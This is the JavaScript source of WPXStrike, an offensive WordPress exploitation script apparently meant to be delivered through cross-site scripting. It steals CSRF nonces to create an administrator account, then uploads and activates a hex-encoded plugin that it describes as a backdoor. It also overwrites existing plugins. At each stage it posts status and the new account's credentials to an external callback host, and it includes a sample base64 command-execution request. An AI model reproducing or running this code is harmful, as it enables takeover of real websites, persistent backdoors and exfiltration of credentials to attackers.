/*
              ;,_            ,
                 _uP~"b          d"u,
                dP'   "b       ,d"  "o
               d"    , `b     d"'    "b
              l] [    " `l,  d"       lb
              Ol ?     "  "b`"=uoqo,_  "l
            ,dBb "b        "b,    `"~~TObup,_
          ,d" (db.`"         ""     "tbc,_ `~"Yuu,_
        .d" l`T'  '=                      ~     `""Yu,
      ,dO` gP,                           `u,   b,_  "b7         
     d?' ,d" l,                           `"b,_ `~b  "1
   ,8i' dl   `l                 ,ggQOV",dbgq,._"  `l  lb      WPXStrike (https://github.com/nowak0x01/WPXStrike)
  .df' (O,    "             ,ggQY"~  , @@@@@d"bd~  `b "1
 .df'   `"           -=@QgpOY""     (b  @@@@P db    `Lp"b,
.d(                  _               "ko "=d_,Q`  ,_  "  "b,
Ql         .         `"qo,._          "tQo,_`""bo ;tb,    `"b,
qQ         |L           ~"QQQgggc,_.,dObc,opooO  `"~~";.   __,7,
qp         t\io,_           `~"TOOggQV""""        _,dg,_ =PIQHib.
`qp        `Q["tQQQo,_                          ,pl{QOP"'   7AFR`
  `         `tb  '""tQQQg,_             p" "b   `       .;-.`Vl'
             "Yb      `"tQOOo,__    _,edb    ` .__   /`/'|  |b;=;.__
                           `"tQQQOOOOP""`"\QV;qQObob"`-._`\_~~-._
                                """"    ._        /   | |oP"\_   ~\ ~\_~\
                                        `~"\ic,qggddOOP"|  |  ~\   `\~-._
                                          ,qP`"""|"   | `\ `;   `\   `\
                               _        _,p"     |    |   `\`;    |    |
    @Author: Hudson Nowak      "boo,._dP"       `\_  `\    `\|   `\   ;
                                 `"7tY~'            `\  `\    `|_   |
                                                      `~\  |
*/


// ************************************ ~% Variables %~ ************************************ //

var Target = "https://10.0.1.73:10050/wp/"; // Ex: https://172.16.0.13:8000/wordpress/
var Callback = "https://xopy8j7taqgx8638bcvddnufh3nxbozd.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

// WPCreateAccount(); // (Privilege Escalation) - Creates an user in WordPress.
// WPUploadCustomPlugin(); // (RCE) - Upload your custom plugin (backdoor) to WordPress.
// WPEditPlugins(); // (RCE) - Edit a Built-In Plugins in WordPress.
// WPEditThemes(); // (RCE) - Edit a Built-In Themes in WordPress.
// CustomExploits(); // (Custom) - Custom Exploits for Third-Party WordPress Plugins/Themes.

function WPCreateAccount() {

    /* ************************************************************************************************************************************************ */
    var Username = "nowak";         // Ex: operator (It is recommended to use a valid employee name from the target company).
    var Password = `j^QEkyvd7*g3xqsE`;          // (weak password are allowed).
    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered).
    var Role = "administrator";                 // Ex: administrator, editor, author, contributor, subscriber.
    var FirstName = ""; // (optional)
    var LastName = "";  // (optional)
    /* ************************************************************************************************************************************************ */

    // ************************************ ~% WPCreateAccount Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    // WPXCreateAccount(); // Wordpress Create Account Module for Wordpress 6.X.X, 5.X.X and 4.X.X.
    /* ************************************************************************************************************************************************ */

    // Wordpress Create Account Module for Wordpress 6.X.X, 5.X.X and 4.X.X.
    function WPXCreateAccount() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "wp-admin/user-new.php", false);
        _stage1.send();

        if (_stage1.responseText) {

            var csrf_token = _stage1.responseText.match(/id="_wpnonce_create-user"[\s\S]*?value="(.*?)"/)[1];

            if (csrf_token) {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + "wp-admin/user-new.php", false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send("action=createuser&_wpnonce_create-user=" +
                    csrf_token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" +
                    encodeURIComponent(Username) + "&email=" +
                    encodeURIComponent(Email) + "&first_name=" +
                    encodeURIComponent(FirstName) + "&last_name=" +
                    encodeURIComponent(LastName) + "&url=&pass1=" +
                    encodeURIComponent(Password) + "&pass2=" +
                    encodeURIComponent(Password) + "&pw_weak=on&role=" +
                    Role + "&createuser=Add%2BNew%2BUser");

                if (_stage2.responseText.match("already registered")) {

                    if (Callback) {

                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/user-new.php",
                                    "Module": "WPCreateAccount.WPXCreateAccount()",
                                    "Message": "[ERROR] Stage 2 - Unable to create the user!.",
                                    "About": _stage2.responseText.match(/<div class="error">\s*<p><strong>Error:<\/strong>\s*(.*?)<\/p>/)[1],
                                    "Data": {
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": Role,
                                        "FirstName": FirstName,
                                        "LastName": LastName
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else if (_stage2.responseText.match(Username)[0]) {

                    if (Callback) {

                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/user-new.php",
                                    "Module": "WPCreateAccount.WPXCreateAccount()",
                                    "Message": "[Sucessful] The user has been successfully created!.",
                                    "Data": {
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": Role,
                                        "FirstName": FirstName,
                                        "LastName": LastName
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {

                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/user-new.php",
                                    "Module": "WPCreateAccount.WPXCreateAccount()",
                                    "Message": "[ERROR] Stage 2 - Unable to create the user!.",
                                    "About": _stage2.responseText.match(/<div class="error">\s*<p><strong>Error:<\/strong>\s*(.*?)<\/p>/)[1],
                                    "Data": {
                                        "User": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": Role,
                                        "FirstName": FirstName,
                                        "LastName": LastName
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {

                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/user-new.php",
                                "Module": "WPCreateAccount.WPXCreateAccount()",
                                "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                "Data": {
                                    "User": Username,
                                    "Email": Email,
                                    "Password": Password,
                                    "Role": Role,
                                    "FirstName": FirstName,
                                    "LastName": LastName
                                },
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }
            }

        } else {

            if (Callback) {

                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/user-new.php",
                            "Module": "WPCreateAccount.WPXCreateAccount()",
                            "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }
}

function WPUploadCustomPlugin() {

    // ************************************ ~% WPUploadCustomPlugin Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    // WPXUploadCustomPlugin(); // Wordpress Upload Custom Plugin Module for Wordpress 6.X.X and 5.X.X.
    // WP4UploadCustomPlugin(); // Wordpress Upload Custom Plugin Module for Wordpress 4.X.X.
    /* ************************************************************************************************************************************************ */

    // Wordpress Upload Custom Plugin Module for Wordpress 6.X.X and 5.X.X.
    function WPXUploadCustomPlugin() {

        /* ************************************************************************************************************************************************ */
        // The name and the filename of your plugin. (only change it if you are going to use another plugin other than WPAnalytics).
        var Plugin = "WPAnalytics/WPAnalytics.php";

        // The Contents of your .zip plugin file encoded in Hex. (only change it if you are going to use another plugin other than WPAnalytics) -> Ex: xxd -p -c 0 [File.zip].
        var HexFileContent = "504b0304140000000800aa1b2f57899a2b6b86020000fe0400000f001c005750416e616c79746963732e706870555409000390cf036590cf036575780b000104e803000004e8030000cd535d4fdb40107c4e7ec516214810b6f9286d815a2d8236a04a9052681eaa0aaded4d7c8d7d77ba3bc70988ffdebd38a429a2efb5fc70be9dd99ddd59bfffa073dd8eb6dab00583fe89c462e6446afde747ac5cae0cac3ce7556695844b55e398217354ad4ca60d591be8a21a09e92ffbf3135c6249470beab3e467645323b4134abe8000610141ab9accb02a0097f74d0918b2ac01d7edfbbae07274a08d9a888c2ccc5405b5703964441a84b462943bce289df2310335255638dae46c9c5e9912654a5c2383ca928184729c08654218f82c847616381518c20c32b479a2d064768e4f55c99de7c435260486b432ce6ecf15a428a1c43131c5619019064856940acb1db364058a9b2fc53d3d17952ae948ba6d10a5ef891a55244738a2721ef0a513a5ac6ba84a164212780f883b09fd784f1aeb6eaf2f9ea60bb973da1e45d188bbaa9290b547d2fbb833ddd98d3ce73b19bb62877f0ec23d8e44ed766b3dc5a248301d430c095a7af3fa8ebb511975d6effa57df6e7e6c7ed97d77589eedfddafcd93d862882d31ce588e02617d6d319fa4fea550f0ff7b331be446db7c4b023ac25d7596ae8c2c606fc51f42a86b5b52e3c30d68357a4c61ce1fd1672a818b038759a22d7e42a23572f3bce1b86502835065ea94c584c0aba1b56327573db22f661228c92de0898a0111e60bbbe72b4059fa658ea82fc57cb770651ad83859f51b3ba367a680e8fd1c35014f418faff8ff1e7ece7115093c1bbe32f4f1b6e7033d3fc23a1d68548d14b89a6415dd781dfdea03205fbcef3cc3c250cc379fd273be2b497d7383828933a8e7d84ed6c3dfe3d56e62e46ea5d5a8eb3d5e27739cd05eef8ffeef5f37dba7fad52791b6f3c6d558c83af6f2f7ad3fb8bd3dd3ce98d56a6f01b504b01021e03140000000800aa1b2f57899a2b6b86020000fe0400000f0018000000000001000000a481000000005750416e616c79746963732e706870555405000390cf036575780b000104e803000004e8030000504b0506000000000100010055000000cf0200000000";

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "wp-admin/plugin-install.php", false);
        _stage1.send();

        if (_stage1.responseText) {

            var csrf_token = _stage1.responseText.match(/<input\s+type="hidden"\s+id="_wpnonce"\s+name="_wpnonce"\s+value="([^"]+)"\s*\/>/)[1];

            if (csrf_token) {

                var blob = hexToBlob(HexFileContent);
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("_wpnonce", `${csrf_token}`);
                formData.append("_wp_http_referer", "/wp-admin/plugin-install.php");
                formData.append("pluginzip", new Blob([blob], { type: "application/octet-stream" }), Plugin.match(/([^/]+)/)[0] + ".zip");

                function hexToBlob(hexString) {
                    const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
                    return new Blob([arrayBuffer], { type: 'application/octet-stream' });
                }

                var _stage2 = new XMLHttpRequest();

                _stage2.open("POST", Target + "wp-admin/update.php?action=upload-plugin", false);
                _stage2.send(formData);

                // Extract from "plugins.php?action=activate" the Plugin Name and CSRF Token
                var _csrf_token2 = _stage2.responseText.match(/plugins\.php\?action=activate[^"]*&amp;_wpnonce=([^"&]+)/);
                var _Plugin = _stage2.responseText.match(/href="[^"]*plugins\.php\?action=activate[^"]*&amp;plugin=([^&]+)&amp;_/);

                if (_csrf_token2 !== null) { csrf_token2 = _csrf_token2[1]; }
                if (_Plugin !== null) { Plugin = _Plugin[1]; }

                if (_stage2.responseText.match("Destination folder already exists") || _stage2.responseText.match("This plugin is already installed")) {

                    if (Callback) {

                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                    "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                    "Message": "[ERROR] Stage 2 - (Unable to upload the plugin: " + Plugin + ", but don't worry—I'm currently attempting to overwrite the existing installation of the plugin.)",
                                    "About": "Destination folder already exists OR This plugin is already installed.",
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                    var _overwrite = _stage2.responseText.match(/<a[^>]*class="[^"]*\bupdate-from-upload-overwrite\b[^"]*"[^>]*\bhref="([^"]*)"[^>]*>/)[1];
                    _overwrite = _overwrite.replace(/&amp;/g, '&');

                    var _ = new XMLHttpRequest();
                    _.open("GET", Target + "wp-admin/" + _overwrite, false);
                    _.send();

                    if (_.responseText.match("Plugin updated successfully.")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/" + _overwrite,
                                        "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                        "Message": "[Sucessful] Stage 2 - (The plugin: " + _stage2.responseText.match(/Destination folder already exists\.\s*([\s\S]*?)<\/p>/)[1] + " has been successfully overwritten!)",
                                        "About": [
                                            "Your plugin has been uploaded to the Directory: " + _stage2.responseText.match(/Destination folder already exists\.\s*([\s\S]*?)<\/p>/)[1] + ". To trigger the backdoor, access the URL: " + Target + "wp-content/plugins/<YourPlugin>/<file>.php",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                        if (_.responseText.match("Activate Plugin")) {

                            // Extract the Plugin Name and CSRF Token from the "plugins.php?action=activate".
                            var _y = _.responseText.match(/<a class="button button-primary" href="([^"]+)"[^>]*>Activate Plugin<\/a>/)[1];
                            _y = _y.replace(/&amp;/g, '&');
                            var csrf_token2 = _y.match(/(?:[?&])_wpnonce=([^&]+)/)[1];
                            var Plugin = _y.match(/(?:[?&])plugin=([^&]+)/)[1];

                            // Activate the Plugin
                            var _stage3 = new XMLHttpRequest();
                            _stage3.open("GET", Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2, false);
                            _stage3.send();

                            if (_stage3.responseText.match("Plugin activated")) {

                                if (Callback) {

                                    var _callback = new XMLHttpRequest();
                                    _callback.open("POST", Callback, true);
                                    _callback.send(
                                        JSON.stringify(
                                            {
                                                "Host": Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2,
                                                "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                                "Message": "[Sucessful] Stage 3 - Plugin: " + decodeURIComponent(Plugin) + " has been Successfully Activated!",
                                                "About": [
                                                    "If you're using the default WPAnalytics Plugin embedded in the exploit, you can activate the backdoor functionality by accessing any WordPress endpoint.",
                                                    "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                                    "",
                                                    "# HTTP Request Example #",
                                                    "POST / HTTP/2",
                                                    "Host: localhost",
                                                    "Content-Type: application/x-www-form-urlencoded",
                                                    "[\r\n]",
                                                    "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                                    ""
                                                ],
                                                "Date": new Date().toUTCString()
                                            }
                                        )
                                    );
                                }
                            }
                        }
                    }

                } else if (Plugin && csrf_token2) {

                    if (Callback) {

                        var _callbackx = new XMLHttpRequest();
                        _callbackx.open("POST", Callback, true);
                        _callbackx.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                    "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                    "Message": "[Sucessful] Stage 2 - (The plugin: " + decodeURIComponent(Plugin) + " has been Successfully Uploaded!)",
                                    "About": [
                                        "Your plugin: " + decodeURIComponent(Plugin) + " has been uploaded to the directory: " + "wp-content/plugins/" + decodeURIComponent(Plugin) + ". To trigger the backdoor, access the URL: " + Target + "wp-content/plugins/" + decodeURIComponent(Plugin),
                                        "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                    ],
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                    // Activate the Plugin
                    var _stage3 = new XMLHttpRequest();
                    _stage3.open("GET", Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2, false);
                    _stage3.send();

                    if (_stage3.responseText.match("Plugin activated")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2,
                                        "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                        "Message": "[Sucessful] Stage 3 - Plugin: " + decodeURIComponent(Plugin) + " has been Successfully Activated!",
                                        "About": [
                                            "If you're using the default WPAnalytics Plugin embedded in the exploit, you can activate the backdoor functionality by accessing any WordPress endpoint.",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "POST / HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _xcallback = new XMLHttpRequest();
                        _xcallback.open("POST", Callback, true);
                        _xcallback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                    "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                    "Message": "[UNKNOWN ERROR] Stage 2 - (Cannot Upload the Plugin: " + Plugin + ".)",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_stage2.responseText)
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/plugin-install.php",
                                "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                "Message": "[ERROR] Stage 1 - (Cannot GET CSRF_TOKEN)",
                                "Date": new Date().toUTCString(),
                                "About": encodeURIComponent(_stage1.responseText)
                            }
                        )
                    );
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/plugin-install.php",
                            "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                            "Message": "[ERROR] Stage 1 - (Unable to retrieve server response.)",
                            "Date": new Date().toUTCString(),
                        }
                    )
                );
            }
        }
    }

    // Wordpress Upload Custom Plugin Module for Wordpress 4.X.X.
    function WP4UploadCustomPlugin() {

        /* ************************************************************************************************************************************************ */
        // The name and the filename of your plugin. (only change it if you are going to use another plugin other than WPAnalytics).
        var Plugin = "WPAnalytics/WPAnalytics.php";

        // The Contents of your .zip plugin file encoded in Hex. (only change it if you are going to use another plugin other than WPAnalytics) -> Ex: xxd -p -c 0 [File.zip].
        var HexFileContent = "504b0304140000000800aa1b2f57899a2b6b86020000fe0400000f001c005750416e616c79746963732e706870555409000390cf036590cf036575780b000104e803000004e8030000cd535d4fdb40107c4e7ec516214810b6f9286d815a2d8236a04a9052681eaa0aaded4d7c8d7d77ba3bc70988ffdebd38a429a2efb5fc70be9dd99ddd59bfffa073dd8eb6dab00583fe89c462e6446afde747ac5cae0cac3ce7556695844b55e398217354ad4ca60d591be8a21a09e92ffbf3135c6249470beab3e467645323b4134abe8000610141ab9accb02a0097f74d0918b2ac01d7edfbbae07274a08d9a888c2ccc5405b5703964441a84b462943bce289df2310335255638dae46c9c5e9912654a5c2383ca928184729c08654218f82c847616381518c20c32b479a2d064768e4f55c99de7c435260486b432ce6ecf15a428a1c43131c5619019064856940acb1db364058a9b2fc53d3d17952ae948ba6d10a5ef891a55244738a2721ef0a513a5ac6ba84a164212780f883b09fd784f1aeb6eaf2f9ea60bb973da1e45d188bbaa9290b547d2fbb833ddd98d3ce73b19bb62877f0ec23d8e44ed766b3dc5a248301d430c095a7af3fa8ebb511975d6effa57df6e7e6c7ed97d77589eedfddafcd93d862882d31ce588e02617d6d319fa4fea550f0ff7b331be446db7c4b023ac25d7596ae8c2c606fc51f42a86b5b52e3c30d68357a4c61ce1fd1672a818b038759a22d7e42a23572f3bce1b86502835065ea94c584c0aba1b56327573db22f661228c92de0898a0111e60bbbe72b4059fa658ea82fc57cb770651ad83859f51b3ba367a680e8fd1c35014f418faff8ff1e7ece7115093c1bbe32f4f1b6e7033d3fc23a1d68548d14b89a6415dd781dfdea03205fbcef3cc3c250cc379fd273be2b497d7383828933a8e7d84ed6c3dfe3d56e62e46ea5d5a8eb3d5e27739cd05eef8ffeef5f37dba7fad52791b6f3c6d558c83af6f2f7ad3fb8bd3dd3ce98d56a6f01b504b01021e03140000000800aa1b2f57899a2b6b86020000fe0400000f0018000000000001000000a481000000005750416e616c79746963732e706870555405000390cf036575780b000104e803000004e8030000504b0506000000000100010055000000cf0200000000";

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "wp-admin/plugin-install.php", false);
        _stage1.send();

        if (_stage1.responseText) {

            var csrf_token = _stage1.responseText.match(/<input\s+type="hidden"\s+id="_wpnonce"\s+name="_wpnonce"\s+value="([^"]+)"\s*\/>/)[1];

            if (csrf_token) {

                var blob = hexToBlob(HexFileContent);
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("_wpnonce", `${csrf_token}`);
                formData.append("_wp_http_referer", "/wp-admin/plugin-install.php");
                formData.append("pluginzip", new Blob([blob], { type: "application/octet-stream" }), Plugin.match(/([^/]+)/)[0] + ".zip");

                function hexToBlob(hexString) {
                    const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
                    return new Blob([arrayBuffer], { type: 'application/octet-stream' });
                }

                var _stage2 = new XMLHttpRequest();

                _stage2.open("POST", Target + "wp-admin/update.php?action=upload-plugin", false);
                _stage2.send(formData);

                // Extract from "plugins.php?action=activate" the Plugin Name and CSRF Token
                var _csrf_token2 = _stage2.responseText.match(/plugins\.php\?action=activate[^"]*&amp;_wpnonce=([^"&]+)/);
                var _Plugin = _stage2.responseText.match(/href="[^"]*plugins\.php\?action=activate[^"]*&amp;plugin=([^&]+)&amp;_/);

                if (_csrf_token2 !== null) { csrf_token2 = _csrf_token2[1]; }
                if (_Plugin !== null) { Plugin = _Plugin[1]; }

                if (_stage2.responseText.match("Destination folder already exists") || _stage2.responseText.match("This plugin is already installed")) {

                    if (Callback) {

                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                    "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                    "Message": "[ERROR] Stage 2 - (Unable to upload the plugin: " + Plugin + ", but don't worry—I'm currently attempting to rename the plugin and reupload it (this is necessary for WP 4.X.X, it is not feasible to overwrite the existing plugin).)",
                                    "About": "Destination folder already exists OR This plugin is already installed.",
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                    Plugin = Plugin.replace(Plugin, new Date().getTime() + "-" + Plugin);

                    var blob = hexToBlob(HexFileContent);
                    var boundary = "--nowak0x01";
                    var formData = new FormData();
                    formData.append("_wpnonce", `${csrf_token}`);
                    formData.append("_wp_http_referer", "/wp-admin/plugin-install.php");
                    formData.append("pluginzip", new Blob([blob], { type: "application/octet-stream" }), Plugin.match(/([^/]+)/)[0] + ".zip");

                    function hexToBlob(hexString) {
                        const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
                        return new Blob([arrayBuffer], { type: 'application/octet-stream' });
                    }

                    var _stage2 = new XMLHttpRequest();

                    _stage2.open("POST", Target + "wp-admin/update.php?action=upload-plugin", false);
                    _stage2.send(formData);

                    // Extract from "plugins.php?action=activate" the Plugin Name and CSRF Token
                    var _csrf_token2 = _stage2.responseText.match(/plugins\.php\?action=activate[^"]*&amp;_wpnonce=([^"&]+)/);
                    var _Plugin = _stage2.responseText.match(/href="[^"]*plugins\.php\?action=activate[^"]*&amp;plugin=([^&]+)&amp;_/);

                    if (_csrf_token2 !== null) { csrf_token2 = _csrf_token2[1]; }
                    if (_Plugin !== null) { Plugin = _Plugin[1]; }

                    if (Plugin && csrf_token2) {

                        if (Callback) {

                            var _callbackx = new XMLHttpRequest();
                            _callbackx.open("POST", Callback, true);
                            _callbackx.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                        "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                        "Message": "[Sucessful] Stage 2 - (The plugin: " + decodeURIComponent(Plugin) + " has been Successfully Uploaded!)",
                                        "About": [
                                            "Your plugin: " + decodeURIComponent(Plugin) + " has been uploaded to the directory: " + "wp-content/plugins/" + decodeURIComponent(Plugin) + ". To trigger the backdoor, access the URL: " + Target + "wp-content/plugins/" + decodeURIComponent(Plugin),
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                        // Activate the Plugin
                        var _stage3 = new XMLHttpRequest();
                        _stage3.open("GET", Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2, false);
                        _stage3.send();

                        if (_stage3.responseText.match("Plugin <strong>activated</strong>")) {

                            if (Callback) {

                                var _callback = new XMLHttpRequest();
                                _callback.open("POST", Callback, true);
                                _callback.send(
                                    JSON.stringify(
                                        {
                                            "Host": Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2,
                                            "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                            "Message": "[Sucessful] Stage 3 - Plugin: " + decodeURIComponent(Plugin) + " has been Successfully Activated!",
                                            "About": [
                                                "If you're using the default WPAnalytics Plugin embedded in the exploit, you can activate the backdoor functionality by accessing any WordPress endpoint.",
                                                "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                                "",
                                                "POST / HTTP/2",
                                                "Host: localhost",
                                                "Content-Type: application/x-www-form-urlencoded",
                                                "[\r\n]",
                                                "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                                ""
                                            ],
                                            "Date": new Date().toUTCString()
                                        }
                                    )
                                );
                            }
                        }

                    } else {

                        if (Callback) {
                            var _xcallback = new XMLHttpRequest();
                            _xcallback.open("POST", Callback, true);
                            _xcallback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                        "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                        "Message": "[UNKNOWN ERROR] Stage 2 - (Cannot Upload the Plugin: " + Plugin + ".)",
                                        "Date": new Date().toUTCString(),
                                        "About": encodeURIComponent(_stage2.responseText)
                                    }
                                )
                            );
                        }
                    }

                } else if (Plugin && csrf_token2) {

                    if (Callback) {

                        var _callbackx = new XMLHttpRequest();
                        _callbackx.open("POST", Callback, true);
                        _callbackx.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                    "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                    "Message": "[Sucessful] Stage 2 - (The plugin: " + decodeURIComponent(Plugin) + " has been Successfully Uploaded!)",
                                    "About": [
                                        "Your plugin: " + decodeURIComponent(Plugin) + " has been uploaded to the directory: " + "wp-content/plugins/" + decodeURIComponent(Plugin) + ". To trigger the backdoor, access the URL: " + Target + "wp-content/plugins/" + decodeURIComponent(Plugin),
                                        "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                    ],
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                    // Activate the Plugin
                    var _stage3 = new XMLHttpRequest();
                    _stage3.open("GET", Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2, false);
                    _stage3.send();

                    if (_stage3.responseText.match("Plugin <strong>activated</strong>")) {

                        if (Callback) {

                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2,
                                        "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
                                        "Message": "[Sucessful] Stage 3 - Plugin: " + decodeURIComponent(Plugin) + " has been Successfully Activated!",
                                        "About": [
                                            "If you're using the default WPAnalytics Plugin embedded in the exploit, you can activate the backdoor functionality by accessing any WordPress endpoint.",
                                            "To see examples, check: https://github.com/nowak0x01/WPXStrike",
                                            "",
                                            "POST / HTTP/2",
                                            "Host: localhost",
                                            "Content-Type: application/x-www-form-urlencoded",
                                            "[\r\n]",
                                            "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                            ""
                                        ],
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }
                    }

                } else {

                    if (Callback) {
                        var _xcallback = new XMLHttpRequest();
                        _xcallback.open("POST", Callback, true);
                        _xcallback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                    "Module": "WPUploadCustomPlugin.WPXUploadCustomPlugin()",
